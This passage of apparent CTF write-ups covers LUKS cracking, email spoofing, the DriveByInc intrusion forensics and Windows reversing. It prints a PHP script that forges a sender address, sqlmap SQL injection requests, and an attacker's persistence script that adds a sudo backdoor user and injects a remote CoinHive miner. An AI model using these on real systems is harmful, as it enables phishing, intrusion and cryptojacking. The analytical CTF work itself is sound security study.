which means the encryption used was AES-512 and not AES-256, after this I remembered that we got two AES-256 from findaes, what if the full keys is the two keys joined? so lets try that: 12$ echo '8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5' | tr -d ' ' | xxd -r -p &gt; key0$ sudo cryptsetup luksOpen --master-key-file key0 /dev/loop0 decrypted And it worked! the command didn’t spit any kind of errors so lets mount it and get the flag: 12345$ sudo mount /dev/mapper/decrypted /mnt/$ ls /mnt/collected-wallpapers-master/ ctfscoreboard-master/ flag.txt lost+found/$ cat /mnt/flag.txt CTF&#123;lucky_U_k33p_secrets!&#125; The flag was CTF{lucky_U_k33p_secrets!}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"bsidesSF","slug":"bsidesSF","permalink":"https://teamrocketist.github.io/tags/bsidesSF/"},{"name":"luks","slug":"luks","permalink":"https://teamrocketist.github.io/tags/luks/"},{"name":"masterkey","slug":"masterkey","permalink":"https://teamrocketist.github.io/tags/masterkey/"}]},{"title":"[Forensics] BsidesSF 2019 - goodluks2","slug":"Forensics-BsidesSF-2019-goodluks2","date":"2019-03-05T02:18:25.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/03/05/Forensics-BsidesSF-2019-goodluks2/","link":"","permalink":"https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/","excerpt":"","text":"goodluks2100 Description:Our first insider threat has lead to a second insider. We haven’t found any clues to the passphrase here, but given thevocabulary of the suspect, I don’t think you’ll have a hard time. https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks2.7z We have disk image and by the name of the challenge and the description we can already guess that it’s encrypted with luks 12$ file goodluks2.img goodluks2.img: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x0,32,33), end-CHS (0x51,85,4), startsector 2048, 67106816 sectors, extended partition table (last) We don’t any more files so we need to actually brute force the passphrase, so let’s try using hashcat for this. But First of all we need to set up a loop device of our image, we need to check the partitions with parted and look at the offset: 12345678910111213$ sudo parted goodluks2.img GNU Parted 3.2(parted) U Unit? [compact]? B (parted) print Model: (file)Disk ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: 34359738368BSector size (logical/physical): 512B/512BPartition Table: msdosDisk Flags: Number Start End Size Type File system Flags 1 1048576B 34359738367B 34358689792B primary We want to loop the primary partition so we want to use losetup at 1048576 offset: 12345$ ls /dev/loop*/dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4 /dev/loop5 /dev/loop6 /dev/loop7 /dev/loop-control$ sudo losetup --offset 1048576 /dev/loop8 goodluks2.img$ ls /dev/loop*/dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4 /dev/loop5 /dev/loop6 /dev/loop7 /dev/loop8 /dev/loop-control Now that we have to extract the luks header which will contain the hash for us to crack, we can use dd but first we need to locate the offset to the header, we can do this with cryptsetup luksDump: 12345678910111213141516171819202122232425262728sudo cryptsetup luksDump /dev/loop8 LUKS header information for /dev/loop8Version: 1Cipher name: aesCipher mode: cbc-essiv:sha256Hash spec: sha1Payload offset: 4096MK bits: 256MK digest: f9 88 ef ee 9e 28 aa 8c 5a 9e ca 1b fa 50 f6 1b be b7 db 85 MK salt: 5b b3 77 d8 e9 dd 1f ea 61 b1 21 20 53 54 e1 e1 b4 fd 11 21 bf 41 67 6f 9d 80 62 f3 b1 2f 6c dd MK iterations: 132387UUID: 4e42c516-dc27-402d-872b-a086739d7e2fKey Slot 0: ENABLED Iterations: 10260 Salt: 73 2d 5e e0 7e 99 40 8c ff ca de 32 c4 2d e0 cd 1b 6d ad b9 39 08 b5 c5 09 04 af 64 28 d5 bd a9 Key material offset: 8 AF stripes: 4000Key Slot 1: DISABLEDKey Slot 2: DISABLEDKey Slot 3: DISABLEDKey Slot 4: DISABLEDKey Slot 5: DISABLEDKey Slot 6: DISABLEDKey Slot 7: DISABLED The payload offset is 4096, now finally we can extract the hash with dd: 1$ sudo dd if=/dev/loop8 of=LUKS_Header.dd bs=521 count=4096 Now we just need to crack with hashcat, I used the password list named rockyou.txt you can find it easily on the internet it took approximately 14 minutes with both CPU and GPU running: After cracking it (gaffer3) we just need decrypt and mount the disk to get the flag! 1234567$ sudo cryptsetup luksOpen /dev/loop11 bkupEnter passphrase for ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: gaffer3$ sudo mount /dev/mapper/bkup /mnt/$ ls /mnt/flag.txt JohnTheRipper.7z lost+found rockyou.7z$ cat /mnt/flag.txt CTF&#123;lame_users_keys_suck&#125; The flag was CTF{lame_users_keys_suck}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"bsidesSF","slug":"bsidesSF","permalink":"https://teamrocketist.github.io/tags/bsidesSF/"},{"name":"luks","slug":"luks","permalink":"https://teamrocketist.github.io/tags/luks/"},{"name":"hashcat","slug":"hashcat","permalink":"https://teamrocketist.github.io/tags/hashcat/"},{"name":"dictionaryAttack","slug":"dictionaryAttack","permalink":"https://teamrocketist.github.io/tags/dictionaryAttack/"}]},{"title":"[MISC] TAMUctf - Onboarding Checklist","slug":"MISC-TAMUctf-Onboarding-Checklist","date":"2019-03-04T11:16:45.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/03/04/MISC-TAMUctf-Onboarding-Checklist/","link":"","permalink":"https://teamrocketist.github.io/2019/03/04/MISC-TAMUctf-Onboarding-Checklist/","excerpt":"","text":"Onboarding Checklist465 Description:From: importantperson@somebigcorp.comDate: Feb 22, 2019 9:00 AMTo: someguy@somebigcorp.comSubject: New Employee Access Hello Some Guy,We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to tamuctf@gmail.com so they can process the account request?Thank you,Important Person The new employee can be a little slow to respond. Difficulty: easy 2/26 8:42 am CST: Visting somebigcorp.com is not part of the challenge The goal of this challenge is clear. Send an email to tamuctf@gmail.com requesting the credentials for the new employee. Although … we need to be disguised as someguy@somebigcorp.com in order to request the credentials. How? *Email spoofing is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source.* To use this technique there is a perfect PHP function called mail(). All we need is a PHP server and an email server (check it up how to setup one on google if you don’t know how to do it) 1234&lt;?phpmail ( string $to , string $subject , string $message [, [mixed] $additional_headers [, string $ additional_parameters ]] ) : bool?&gt; The most important parameters in this case are: From and Reply-To in the additional headers section. In the From argument we put the email we want to spoof and in the Reply-To we chose the email where we want the people that we fooled to send the replies, in this case we want to fool tamuctf@gmail.com. So to retrieve the flag all we need is: PHP Server Email Server An email where we can receive the credentials (let’s call it examplemail@10minutemail.com) Call the PHP mail() function from the server. Put the email where we want to receive the info into the body of the mail()’s message Let’s create the file imnotspoofing.php with the following content12345678910111213&lt;?php$to= 'tamuctf@gmail.com';$subject = 'Requesting new employee credentials';$message= 'Hello. I am request the new employee credentials. Can you send them to my email examplemail@10minutemail.com. Thanks'$headers = array( 'From: someguy@somebigcorp.com', 'Reply-To: examplemail@10minutemail.com', 'X_Mailer: PHP/' . phpversion() );mail($to, $subject, $message, implode(\"\\n\", $headers));?&gt; Shortly after we running this PHP snippet from our server, we’ll receive an email in our examplemail@10minutemail.com with the flag: FLAG: gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"mailSpoofing","slug":"mailSpoofing","permalink":"https://teamrocketist.github.io/tags/mailSpoofing/"}]},{"title":"[Forensics] TAMUctf - DriveByInc","slug":"Forensics-TAMUctf-DriveByInc","date":"2019-03-03T22:04:16.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/03/03/Forensics-TAMUctf-DriveByInc/","link":"","permalink":"https://teamrocketist.github.io/2019/03/03/Forensics-TAMUctf-DriveByInc/","excerpt":"","text":"0_intrusion0_intrusion100Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers.Over the past few years we moved to hosting a large portion of our business on a nice looking website.Recently our customers are complaining that the front page of our website is causing their computers to run extremely slowly.We hope that it is just because we added too much javascript but can you take a look for us just to make sure?1. What is the full malicious line? (Including any HTML tags) For the first part we needed to find the malicious line on this html file, after analysing it we found a malicious line using a known javascript miner api we could also note that the API was being loaded from an external server which the ip is 10.187.195.95. The answer was: 1&lt;script src = http://10.187.195.95/js/colorbox.min.js&gt;&lt;/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous(\"123456-asdfgh\");color.start()&lt;/script&gt;&lt;/body&gt; 1_logs1_logs100Strange.We don’t know how that got there.We have since gone and removed the offending lines.Maybe one of our developers wanted to make some money on the side.Here is a pcap and some web server logs from the day that users started complaining.Can you figure out if something nefarious happened while we go talk to the devs?Link to pcapWhat is the ip of the attacker?What ports did they find open? (List low to high ex: 1,2,3)What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)2/23 1:08 am CST add forgotten log files 2/23 8:29 am CST add slight clarification to 2 What is the ip of the attacker?Now that we have a network capture we can start analysing the network, so for the first question we remembered that there was a JavaScript file being loaded from an ip 10.187.195.95 from the previous part, so we tried to answer that and we got the 1st question, that was indeed the ip from the attacker. What ports did they find open? (List low to high ex: 1,2,3)After this we started to analyse the pcap with this filter ip.src == 10.187.195.95 || ip.dst == 10.187.195.95 with this we removed all the irrelevant packets for the problem. By reading the question we can already know the attacker did a port scan on the server probably used nmap or something so to apply the right filters on tshark and extract the ports we need to know how a port scan works in practice. By just looking at Wireshark in the beginning we can see the attacker used a tcp syn scan: As you can see the attacker issues a lot of syns and receives from the server lot of answers from the server as RST,ACK (wireshark changes the color of this packets to red), RST,ACK means the port is closed… Resuming how a SYN scan works: An attacker issues a SYN, if the server replies SYN,ACK : It means the port is open! An attacker issues a SYN, if the server replies RST,ACK : It means the port is closed! An attacker issues a SYN, if the server does not reply, or replies with ICMP error : it means that port is filtered. Likely an IDS / stateful firewall block your request. So now we need to start working on our tshark command, we need to check which tcp.flags replies with SYN,ACK it needs to come from the server with destination to the attacker IP, the field on wireshark to filter the protocol is ip.proto and the number for TCP protocol is 6, the way I do to find out the name of the fields on wireshark is by doing this: First you choose the field you want to filter:Then a website will open and search for the field you want to filter in this case is “Protocol”:Now you do the same for the tcp flags, to know the number when a SYN,ACK occurs we need to find a successful response to know the number and after we find it we know we need to use tcp.flags == 0x12 filter:The final script is:123$ tshark -r capture.pcap -Y \"ip.dst == 10.187.195.95 &amp;&amp; ip.proto == 6 &amp;&amp; tcp.flags == 0x00000012\" -Tfields -e tcp.srcport | sort -u2280 The answer to the 2nd question is 22,80. What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)So for this I used wireshark, I used the first filter ip.src == 10.187.195.95 || ip.dst == 10.187.195.95 &amp;&amp; http to filter only http packets and now we need to know the replies from the server the ones that answer with a 200 status code, we can see the attacker ran a script with a list of files, the server will reply 404 on files that don’t exist and 200 on the ones that exist… So I used a second filter on wireshark to catch the 200 responses, you can do this by doing EDIT -&gt; Find packet, after this a bunch of buttons will appear below the first filter:If you keep clicking on find it will jump to the next 200 OK, you need to keep looking at the request from the attacker to know which file he’s searching and the response of the server to check if is 200 OK, for example in the image above he did a GET request to / and received a 200 OK meaning that page exist. So with this I keep clicking find and I got all the files I needed which the list is : The answer was:1about.html,adminlogin.html,adminlogin.php,contact.html,gallery.html,index.html,services.html,typo.html With this method I also found an interesting file named backup.sh which will be useful for the next steps:1234567891011121314#!/bin/bashif ! id -u devtest2; then mkdir /home/devtest2 useradd --home=/home/devtest2 -s /bin/bash devtest2 echo \"devtest2:HYf6lEMhUM4Z0b079X\" | chpasswd chown devtest2:devtest2 /home/devtest2 echo 'devtest2 ALL=(ALL:ALL) ALL' &gt;&gt; /etc/sudoersfisudo cat /var/www/html/index.html | grep \"miner.js\"if [ $? != 0 ]; then sed -i 's/&lt;\\/body&gt;/&lt;script src = http:\\/\\/10.187.195.95\\/js\\/colorbox.min.js&gt;&lt;\\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous(\"123456-asdfgh\");color.start()&lt;\\/script&gt;&lt;\\/body&gt;/g' /var/www/html/index.htmlfi 2_AnalysisApparently none of the devs knew what were talking about.Thanks to your initial findings it looks like this may have been an outside attack.Using the logs we already gave you can you dig deeper and see if you can find more information? In the meantime we will try and get files for you to look at.What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)What is the name of the first tool used?What is the version string of the third tool used?What page was attacked with the third tool?2/22 10:49 pm CST updated format on question 1 2/23 12:37 pm CST updated timestamp solution for 1 What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)This question got me a a lot of time simply because they are asking in UTC time zone , I think Wireshark was showing the name on my timezone so I had the adapt the date by subtracting one hour, we need to find the date when the first SYN request was done we can do this with the initial filter we used:The correct date was 05/22/2018:19:07:35 , which was subtracted by 1 hour from what Wireshark was giving me for other people probably you would need to do different things depending on you time zone. What is the name of the first tool used?I eventually just tried nmap and immediately got the right answer but there are other ways to detect if nmap was used for scanning, you can read this blog post I didn’t used but it’s a really interesting read. What is the version string of the third tool used?So we know the second tool used was probably a tool like dir buster to find files on the server, so after finding the existing files is time to check which requests he used on the found files, the more interesting file to look at is the adminlogin.php because it’s a php file and it has communication with the server which was probably the one the attacker used so lets check the user-agent used: The version string was:sqlmap/1.2.4#stable What page was attacked with the third tool?This is already answer form the previous question :) the page is adminlogin.php . 3_ForensicsUnfortunately it looks like the attackers used pretty standard tools to hack into our website.It looks like they didn’t modify the web page from the admin interface on the website though.They probably logged into the webserver somehow. Can you see if you can find out how they got credentials to log in?1 - List the compromised usernames in comma separated alphabetical order (website users)2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password) 1 - List the compromised usernames in comma separated alphabetical order (website users)We already know the attacker used sqlmap for the attack, if you know how sqlmap works it starts by trying alot of queries to find the vulnerability and find the right payload to attack, we can ignore the first requests and start looking at when sqlmap started dumping the database: So as we can see above the database dumping started at package nr 333806, and it starts for dumping the database, to understand the rest we need to understand the sql query sqlmap used. So the query used to extract the database name: 1GET /adminlogin.php?username=adsf' UNION ALL SELECT NULL,CONCAT(0x716b7a6271,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x7171627871),NULL-- jaLN&amp;password=adsf HTTP/1.1 As you can see he’s using union query to concat two additional strings 0x716b7a6271 and 0x7171627871 if we decode both from hex to string we get: 1234$ echo '716b7a6271' | xxd -r -pqkzbq⏎ $ echo '7171627871' | xxd -r -pqqbxq⏎ Sqlmap uses this strings to easily parse content that’s why the output of the request comes very weird like this: 1&lt;html&gt;You logged in as qkzbqSqliDBqqbxq&lt;/html&gt; Just remove both qkzbq and qqbxq and you get SqliDB which is the database name. Now we don’t really care about the database names and table names so we can skip the next requests and look to when they started dumping the usernames and passwords. Request to get the users count number:1GET /adminlogin.php?username=adsf' UNION ALL SELECT NULL,CONCAT(0x716b7a6271,IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x7171627871),NULL FROM SqliDB.Users-- qKQB&amp;password=adsf HTTP/1.1\\r\\n Output of the users number:1&lt;html&gt;You logged in as qkzbq5qqbxq&lt;/html&gt; Removing the parse strings:1&lt;html&gt;You logged in as 5&lt;/html&gt; Request to get the 3rd user on the database id, password, username:1GET /adminlogin.php?username=adsf' UNION ALL SELECT NULL,(SELECT CONCAT(0x716b7a6271,IFNULL(CAST(ID AS CHAR),0x20),0x797570747270,IFNULL(CAST(Password AS CHAR),0x20),0x797570747270,IFNULL(CAST(`User` AS CHAR),0x20),0x7171627871) FROM SqliDB.Users LIMIT 2,1),NULL-- tpEN&amp;password=adsf HTTP/1.1 Output:1&lt;html&gt;You logged in as qkzbq1yuptrp7a4434d48772fee914a99590376ee438yuptrpadminqqbxq&lt;/html&gt; Removing the parse strings:1&lt;html&gt;You logged in as 1 7a4434d48772fee914a99590376ee438 admin&lt;/html&gt; Now you just do the same for the rest of the queries and you get a list of users: 123451 7a4434d48772fee914a99590376ee438 admin2 2e107f8e7aaf178bf00e58c09abfba08 devtest3 5f836ac3e2ea2b22227c940754283fde suzy4 442f0577be5c6e59a77047eaa37b15c6 bob5 5efb309c9b1dc4e90fa136a64e3902e0 alice The answer for this question was:1admin,alice,bob,devtest,suzy 2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)Since we got the list of users and passwords the only one was searchable on the internet was devtest md5 hash the password of devtest was driveby so the answer to this question is: 1devtest:driveby 4_privilege_escalationWe will have to get on to the devs for leaving that account on the website and machine.Some good news is that we finally obtained a disk image of the machine.If the attacker modified the web files on the server they must have had higher privileges than the account you found.See if you can find some information about how they could have done so.Link to disk image (10 GB unzipped)What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?What account were the attackers able to escalate to?What is the password for that account? What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?After mounting the the image: 12sudo mkdir /mnt/roflsudo mount -o ro,noload,noexec filesystem.image /mnt/rofl So after checking the home folder of ubuntu user i saw that setup.sh had read permissions for everyone on that setup.sh file 123456789ls -ltah home/ubuntu/total 28Kdrwxr-xr-x 6 root root 4.0K May 22 2018 ../drwxr-xr-x 3 1001 pcap 4.0K May 22 2018 ./-rwxrwxr-x 1 evilgod evilgod 695 May 22 2018 setup.sh*drwx------ 2 1001 pcap 4.0K May 22 2018 .ssh/-rw-r--r-- 1 1001 pcap 655 May 16 2017 .profile-rw-r--r-- 1 1001 pcap 220 Sep 1 2015 .bash_logout-rw-r--r-- 1 1001 pcap 3.7K Sep 1 2015 .bashrc Any user could read this file so after checking the content of it:1234567891011121314151617181920$ cat home/ubuntu/setup.sh #!/bin/bashexport DEBIAN_FRONTEND=\"noninteractive\"sudo apt-get -y update &amp;&amp; apt-get install -y apache2 apache2-doc apache2-utils mysql-server php libapache2-mod-php php-mcrypt php-mysql pythonsudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_configsudo sed -i 's/StrictModes yes/#StrictModes yes/g' /etc/ssh/sshd_configsudo service ssh restartsudo echo \"root:0A0YlBjrlBXSr14MPz\" | chpasswdexport APACHE_RUN_USER=www-dataexport APACHE_RUN_GROUP=www-dataexport APACHE_PID_FILE=/var/run/apache2.pidexport APACHE_RUN_DIR=/var/run/apache2export APACHE_LOCK_DIR=/var/lock/apache2export APACHE_LOG_DIR=/var/log/apache2sudo service apache2 restart; The root password was there so this is how the attacker got privilege escalation, the answer to this question was: 12$ md5sum home/ubuntu/setup.sh93b74abb459cdd93bd254302fba4dfdf home/ubuntu/setup.sh What account were the attackers able to escalate to?The answer is pretty simple the account was root. What is the password for that account?The password is what we found on the file before which is 0A0YlBjrlBXSr14MPz 5_persistenceThanks for finding that information out.We have since changed the password for that account.Looks like we might have to spend a few days putting our employees through some security training.Unfortunately since deleting the malicous links off of our home page they have reappeared again.Can you figure out how the attacker was able to re infect our home page?1. What is the md5sum of the file the attacker is using for persistence?2. What account was created?3. What group did the attacker add the account to?4. What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am) What is the md5sum of the file the attacker is using for persistence?Remember the file we found on 1_logs ? that’s what he was using for persistence, this file is located in the root directory: 12$ md5sum root/backup.sh29ff58b6607c824451349183a570cc6c root/backup.sh The answer was 29ff58b6607c824451349183a570cc6c What account was created?We could easily see this by just looking at the backup.sh: 1234567891011121314#!/bin/bashif ! id -u devtest2; then mkdir /home/devtest2 useradd --home=/home/devtest2 -s /bin/bash devtest2 echo \"devtest2:HYf6lEMhUM4Z0b079X\" | chpasswd chown devtest2:devtest2 /home/devtest2 echo 'devtest2 ALL=(ALL:ALL) ALL' &gt;&gt; /etc/sudoersfisudo cat /var/www/html/index.html | grep \"miner.js\"if [ $? != 0 ]; then sed -i 's/&lt;\\/body&gt;/&lt;script src = http:\\/\\/10.187.195.95\\/js\\/colorbox.min.js&gt;&lt;\\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous(\"123456-asdfgh\");color.start()&lt;\\/script&gt;&lt;\\/body&gt;/g' /var/www/html/index.htmlfi The user created was devtest2, alternatively we could also look at auth.log file and see: 12345678910$ sudo cat var/log/auth.log... [truncated]May 22 19:11:40 ubuntu-xenial useradd[12186]: new group: name=devtest2, GID=1003May 22 19:11:40 ubuntu-xenial useradd[12186]: new user: name=devtest2, UID=1003, GID=1003, home=/home/devtest2, shell=/bin/bashMay 22 19:11:40 ubuntu-xenial chpasswd[12192]: pam_unix(chpasswd:chauthtok): password changed for devtest2May 22 19:11:40 ubuntu-xenial sudo: root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/bin/cat /var/www/html/index.htmlMay 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session opened for user root by (uid=0)May 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session closed for user rootMay 22 19:11:40 ubuntu-xenial sshd[12140]: pam_unix(sshd:session): session closed for user rootMay 22 19:11:40 ubuntu-xenial systemd-logind[1046]: Removed session 4. So the answer was devtest2 What group did the attacker add the account to?We can get this answer from the backup.sh file from the line: 1echo 'devtest2 ALL=(ALL:ALL) ALL' &gt;&gt; /etc/sudoers The group he added was sudoers group, so the answer was sudoers. What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)So the attacker is using something to automate the script every day, so the first thing that came to my mind was crontab so I just checked the scripts running on crontab from the root user you can find it on the directory var/spool/cron/crontabs/: 12$ ls var/spool/cron/crontabs/root Now seeing the file:12345$ cat var/spool/cron/crontabs/root# DO NOT EDIT THIS FILE - edit the master and reinstall.# (- installed on Tue May 22 19:11:40 2018)# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)30 2 * * 0 root /root/backup.sh &gt; /dev/null 2&gt;&amp;1 Then I used this website to translate those crontab numbers because I was way too lazy to check out how it works (copied the beginning string of 30 2 0): Translation to the 24h notation the answer is 0230.","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"TAMUctf","slug":"TAMUctf","permalink":"https://teamrocketist.github.io/tags/TAMUctf/"}]},{"title":"[Reverse] 35C3 - corebot","slug":"Reverse-35C3-corebot","date":"2018-12-30T10:36:09.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2018/12/30/Reverse-35C3-corebot/","link":"","permalink":"https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/","excerpt":"","text":"Solves: 97 https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6 Difficulty estimate: easy Guest challenge by Jesko / rattle. UPDATE: Challenge binary replaced. Apologies for the inconvenience. Solution Identify which encryption algorithm is being used. Extract the encrypted data from PE resources. Brute-force the last bytes of the serial volume key. Generate the key with the serial. Decrypt the data and obtain the flag. WalkthroughSo we got a windows binary that uses CryptoAPI from Microsoft first thing to do is to open the binary in IDA a check the start function:So after creating the key for AES the program will import the key handle following by decrypting the loaded encrypted data from the PE resources as it is explained in the image bellow:As I explained in the image above if you inspect the sub_11B1146 you will see it’s using the LoadResources function to extract data from the PE executable, this data happens to be the encrypted data. We can extract this data in two ways, either with dynamic analysis or with a tool to extract resources from windows binaries in my case i used wrestool: 123$ wrestool --raw -x corebot-640d3c582340e647d72e1dd9418a3fd6 | xxd00000000: 1029 b845 9d2a ab93 fe89 fb82 9342 a18c .).E.*.......B..00000010: 2e90 6300 0611 8064 b821 c29f 35e7 7ef2 ..c....d.!..5.~. Now that we got the encrypted data we need to find a way to decrypt the data, since the key was created with challenge creator volume serial we need to brute force it, since it’s only using the lower bytes of the serial we only need to brute force two bytes. Time to write a script to bruteforce the serial and decrypt: 12345678910111213141516171819202122232425262728import base64import hashlibimport sysfrom Crypto import Randomfrom Crypto.Cipher import AESdef decrypt_ecb_cipher(ciphertext, key): cipher = AES.new(key, AES.MODE_ECB) plaintext = cipher.decrypt(ciphertext) return plaintextfor i in xrange(0xffff+1): v5 = 0x10 v4 = i key = '' while True: key = chr(((v4 &amp; 0xffff) &amp; 0xff)) + chr(((v4 &amp; 0xffff) &amp; 0xff00) &gt;&gt; 8) + key; v4 ^= ((v4 &amp; 0xffff) &gt;&gt; 4) ^ ((v4 &amp; 0xffff) &lt;&lt; 11) ^ ((v4 &amp; 0xffff) &lt;&lt; 7) v5 -= 1 if v5 == 0: break ciphertext = \"\\x10\\x29\\xb8\\x45\\x9d\\x2a\\xab\\x93\\xfe\\x89\\xfb\\x82\\x93\\x42\\xa1\\x8c\\x2e\\x90\\x63\\x00\\x06\\x11\\x80\\x64\\xb8\\x21\\xc2\\x9f\\x35\\xe7\\x7e\\xf2\" message = decrypt_ecb_cipher(ciphertext, key) if message[:4] == '35C3': sys.stdout.write(message) print hex(i) break Now running the script: 123$ python corebot.py35C3_MalwareAuthorKryptoChef0x25c3 The lower bytes of the serial is 0x25c3 and the respective flag was 35C3_MalwareAuthorKryptoChef.","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"cryptoApi","slug":"cryptoApi","permalink":"https://teamrocketist.github.io/tags/cryptoApi/"},{"name":"35C3","slug":"35C3","permalink":"https://teamrocketist.github.io/tags/35C3/"},{"name":"windowsBinary","slug":"windowsBinary","permalink":"https://teamrocketist.github.io/tags/windowsBinary/"},{"name":"exeResources","slug":"exeResources","permalink":"https://teamrocketist.github.io/tags/exeResources/"}]},{"title":"[Reverse] 35C3 - juggle","slug":"Reverse-35C3-juggle","date":"2018-12-30T01:03:08.000Z","updated":"2022-08-23T23:16:32.375Z","comments":true,"path":"2018/12/30/Reverse-35C3-juggle/","link":"","permalink":"https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/","excerpt":"","text":"juggle 97 Solves: 54 Can you help this restaurant Stack the right amount of Eggs in their ML algorithms? Guest challenge by Tethys. Note that you need to send a shutdown(2) after you sent your solution. The nmap netcat will do so for you, e.g.: ncat 35.246.237.11 1 &lt; solution.xml /usr/bin/ncat –help | grep -n 1 Ncat 7.60 ( https://nmap.org/ncat ) Files here: https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar XSL service is running in the server at a certain port, a dockerfile was provided which was cool, it helped me a lot in the debugging process, in the container environment I had no previous knowledge of xslt which took me more time in this challenge than it should. Solution The seed is not set in random so we can abuse it by doing very quick requests to get the same numbers Identify which plate prints the flag Use the plates in a certain order to achieve the condition necessary to print the flag Walk-throughSo I started by analysing the docker file, the container is using nsjail to isolate the /usr/bin/xalan service as we can see bellow: Setting up the Docker container12345FROM tsuro/nsjailRUN apt-get install -y xalanCOPY challenge.min.xslt /home/user/#COPY tmpflag /flagCMD /bin/sh -c \"/usr/bin/setup_cgroups.sh &amp;&amp; su user -c '/usr/bin/nsjail -Ml --port 1337 --chroot / --user 1000 --group 1000 --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /usr/bin/xalan -xsl /home/user/challenge.min.xslt'\" Eventually I had to fix a line in the docker file at:1COPY challenge/challenge.min.xslt /home/user/ The challenge.min.xslt was located in the root directory after extracting the files, so I ended up changing this into: 1COPY challenge.min.xslt /home/user/ So lets start to build the image with docker build: 1$ sudo docker build -t juggle . After this you can list the image created: 123456789101112131415161718192021$ sudo docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEpermute latest 1603e833509a 23 hours ago 147MBjuggle latest b4c26a022c1e 33 hours ago 205MBtsuro/nsjail latest 8774d7aad732 2 days ago 156MBadalovelace/nodejs latest c2a6e42b25c8 2 days ago 63.7MBnode 6-alpine c45d42c157e3 2 days ago 55.6MBnginx latest 02256cfb0e4b 2 days ago 109MBalpine latest 3f53bb00af94 8 days ago 4.41MBcentos 7 1e1148e4cc2c 3 weeks ago 202MBpostgres latest f9b577fb1ed6 4 weeks ago 311MBthecolonial/police-quest 1.0 0ea244849eb0 4 weeks ago 345MBubuntu 14.04 f17b6a61de28 5 weeks ago 188MBmysql latest f991c20cb508 6 weeks ago 486MBhttpd latest 2a51bb06dc8b 6 weeks ago 132MBdebian latest 4879790bd60d 6 weeks ago 101MBseccon_pwn latest 3749dfe7031c 7 weeks ago 2.06GBskysider/pwndocker latest a24dde07a423 7 weeks ago 2.02GBelasticsearch 2 5e9d896dc62c 3 months ago 479MBpostgres 9.6.2 b3b8a2229953 19 months ago 267MBpostgres 9.6.1 4023a747a01a 23 months ago 265MB As we can see in the list the juggle image was created (the name we gave it). With this we can start running the container by just using docker container run:1$ sudo docker run -it -p 1337:1337 --name 35c3_juggle juggle bash After this a bash console will pop-up in the container unfortunately the command in the end of the docker didn’t work maybe something related with nsjail, I don’t know maybe I did something wrong when I was trying to connect to the service, I even tryed to rerun the command inside the container but it always gave me an error, so to not loose much time identifying it I setted up very quiclky a service with socat, socat isn’t installed in this container so I needed to install it via apt-get: 1root@b0927d9b031a $ socat tcp-listen:1337,fork,reuseaddr 